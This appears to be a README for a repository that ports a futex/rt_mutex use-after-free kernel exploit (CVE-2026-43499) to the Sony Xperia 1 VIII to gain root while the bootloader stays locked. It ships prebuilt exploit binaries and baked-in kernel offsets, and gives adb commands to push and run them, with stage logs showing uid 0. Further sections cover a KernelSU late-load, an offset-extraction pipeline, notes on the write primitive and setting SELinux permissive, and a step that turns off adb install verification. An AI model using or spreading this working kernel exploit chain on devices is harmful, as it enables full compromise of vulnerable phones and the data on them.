# GhostUnlock — Sony Xperia 1 VIII (XQ-GE74)

Temporary, **bootloader-stays-locked** root for the Sony Xperia 1 VIII (XQ-GE74,
Snapdragon 8 Elite / SM8850) on stock firmware `73.0.A.2.53`, kernel
`6.12.38-android16-5-gcaefa63e005e-ab14676683-4k`, Android 16.

Port of [GhostLock / CVE-2026-43499](https://github.com/YuKongA/ghostlock-app)
(a futex/`rt_mutex` priority-inheritance UAF, LPE) to the Xperia 1 VIII kernel,
plus a KernelSU late-load handoff for usable `su`.

Verified on hardware: full chain → uid 0, KernelSU module loaded, SELinux back
to enforcing, **bootloader never unlocked, device never wiped, DRM untouched**.

---

## What you get here

| Path | What |
|---|---|
| `prebuilt/ghostlock` | arm64 exploit binary (built from upstream Apache-2.0 source, NDK r29) with the Xperia offsets baked in |
| `prebuilt/ghostlock-extract-linux-x64` | Linux x86_64 offset extractor (`tools/extract_rs` from the upstream repo) |
| `offsets/offsets.h` | registered kernel-offset table (matched at runtime by `uname -r`) |
| `offsets/offsets.json` | same offsets in importable JSON form |
| `scripts/` | firmware → offsets pipeline, run scripts, per-app backup/restore tooling |

**No Sony firmware is distributed here** (and no device-unique data). You pull
`boot.img` for your own device from your own firmware copy (see below). The
offsets in `offsets/` are derived from the *exact* `73.0.A.2.53` boot image.

---

## Requirements

- Xperia 1 VIII on the exact build `73.0.A.2.53` (kernel
  `6.12.38-android16-5-gcaefa63e005e-ab14676683-4k`). Other builds need
  re-extracted offsets — the upstream extractor refuses patched kernels and
  mismatches fail closed.
- USB debugging enabled (wireless adb works too, just slower).
- Platform-tools on the host.
- For building from source instead of using the prebuilt: Android NDK (r29+)
  and Rust (for the extractor).

## Quick start (prebuilt)

```sh
# 1. push the exploit
adb push prebuilt/ghostlock /data/local/tmp/ghostlock
adb shell chmod 755 /data/local/tmp/ghostlock

# 2. run it (from adb shell, uid 2000 is enough)
adb shell /data/local/tmp/ghostlock
```

Watch for the stage log:

```text
[+] offsets matched: 6.12.38-android16-5-gcaefa63e005e-ab14676683-4k
[*] soc: qcom/6.12; kernel_phys_load=0xc7800000
...
[*] pselect route done calls=1 success=1
...
[+] root script start uid=0 euid=0
```

At this point the generated root script (`/data/local/tmp/.ghostlock_root.sh`)
has executed **as uid 0**. Out of the box it only tries to late-load KernelSU
and logs. To get a *usable* root, do step 3.

## Getting `su` (KernelSU late-load)

1. Install the [KernelSU manager](https://github.com/tiann/KernelSU/releases)
   (v3.3.0 / 32601 works) on the phone:
   ```sh
   adb install KernelSU_v3.3.0_32601-release.apk
   ```
2. Re-run the exploit:
   ```sh
   adb shell /data/local/tmp/ghostlock
   ```
   The root script now finds the manager's embedded `libksud.so` and runs
   `ksud late-load --kmi android16-6.12 --allow-shell`:
   ```text
   [*] late-load kmi=android16-6.12
   [*] late-load exit=0
   [+] KernelSU module loaded
   ```
3. Verify:
   ```sh
   adb shell su -c id
   # uid=0(root) ... context=u:r:ksu:s0
   ```

Root is an in-kernel LKM — **it disappears on reboot**. After any reboot, just
re-run `adb shell /data/local/tmp/ghostlock` (the bootloader is still locked;
this works identically on the locked device). The KernelSU manager shows
`Working <LKM> [Jailbreak mode]`.

## How the offsets were extracted (for other builds)

The current Sony firmware ships partitions as `.sin` files. The new SIN v6
("cms") format is just a **tar** archive:

```sh
tar tf boot_X-FLASH-ALL-DCBF.sin        # → boot.cms, boot.000
tar xf boot_X-FLASH-ALL-DCBF.sin
file boot.000                            # Android bootimg, kernel inside
```

Then build and run the extractor from
[`YuKongA/ghostlock-app`](https://github.com/YuKongA/ghostlock-app)
(`tools/extract_rs`), or use the prebuilt here:

```sh
prebuilt/ghostlock-extract-linux-x64 boot.000 --name xq-ge74 \
    --register --format json --out offsets.json
```

The extractor reports whether the kernel is vulnerable:

```text
info: (CVE-2026-43499 primitive present (remove_waiter@0x1197248 still uses current)
```

Fixed kernels (upstream ≥ 6.12.86 or a vendor backport of
`3bfdc63936dd4773109b7b8c280c0f3b5ae7d349`) are rejected — exit code 6.

If `kernel_phys_load` comes out `null`, the runtime falls back to
`QC_GKI_6_12_PHYS_LOAD` (0xc7800000) automatically for 6.12 Qualcomm kernels —
that value worked on this device.

### Technical notes

- Kernel: 6.12.38 GKI, 4K pages, KASLR slide recovered via tracefs
  (`sched_blocked_reason`), 126,298 symbols recovered from the embedded
  kallsyms table.
- `remove_waiter()` at `.text+0x1197248` still uses `current` → the UAF
  primitive survives.
- `sizeof(struct mm_struct)` = 0x4C0.
- The write primitive is the pselect6 route (6.12 compact frames, waiter
  shift 0); on this device the W2 cred stage needed a handful of retries and
  succeeded on the first script run.
- SELinux was found permissive at exploit time on the test unit; the KernelSU
  late-load re-enforces after module init. If yours is enforcing, the chain
  still works (W1 makes it permissive first).

## Data migration tooling (`scripts/`)

The scripts we used to move app data from another device to this one, kept
because they were half the work. They assume a rooted destination and a
per-app backup layout of:

```
backup_root/<package>/data.tar      # tar of /data/user/0/<package>
backup_root/<package>/userde.tar    # tar of /data/user_de/0/<package>   (optional)
backup_root/<package>/extdata.tar   # tar of /data/media/0/Android/{data,obb}/<package> (optional)
backup_root/<package>/*.apk         # base + split APKs                   (optional)
```

- `scripts/restore_per_app.sh` — installs APKs (root `pm install` from a
  device-side copy; **set `settings put global verifier_verify_adb_installs 0`**
  first, Play Protect's install-time verification stalls large installs) and
  extracts all three tars with uid remap + `restorecon`.
- `scripts/verify_restore.sh` — per-app installed/data-file accounting.
- `scripts/run_ghostlock.sh` — push + run + sanity checks.
- `scripts/extract_boot_from_sin.sh` — the SIN-tar extraction above.

Serials/paths are parameters (`$SERIAL`, `$BACKUP_SRC`) — nothing
device-identifying is embedded.

## Warnings

- This is a kernel-memory-corruption exploit. The upstream engine verifies
  offsets and fails closed on mismatch, but a race can still leave stale PI
  state — after the stack-writer stage, use **one attempt per boot**; reboot
  between attempts.
- Don't relock the bootloader over any modified partition; that bricks
  verified-boot devices. This exploit never needs an unlock.
- Only use on devices you own.

## Credits & licensing

| Project | License | Role |
|---|---|---|
| [YuKongA/ghostlock-app](https://github.com/YuKongA/ghostlock-app) | Apache-2.0 | exploit engine + offset extractor; `prebuilt/` binaries are compiled from this source |
| [NebuSec/CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) | Apache-2.0 | upstream GhostLock research and exploit source |
| [tiann/KernelSU](https://github.com/tiann/KernelSU) | GPL-2.0+ (code) / Apache-2.0 (parts) | **not shipped** — the module is late-loaded at runtime from the user's own manager APK |
| [munjeni/newflasher](https://github.com/munjeni/newflasher) | MIT | referenced for flashing only; not shipped |
| Rust ecosystem crates | MIT / Apache-2.0 | extractor dependencies |

Kernel offsets in `offsets/` were derived from an independently obtained
firmware image and are published under Apache-2.0. Sony firmware is **not**
distributed here. See `NOTICE` for the full attribution required by
Apache-2.0 §4.

## License

**Apache-2.0** for everything in this repository — the same license as every
upstream project whose code was compiled or adapted here, so no license
conflicts arise. KernelSU's GPL-licensed kernel code is never distributed
in this repository (its userspace late-load design keeps the module in the
user-supplied manager APK).
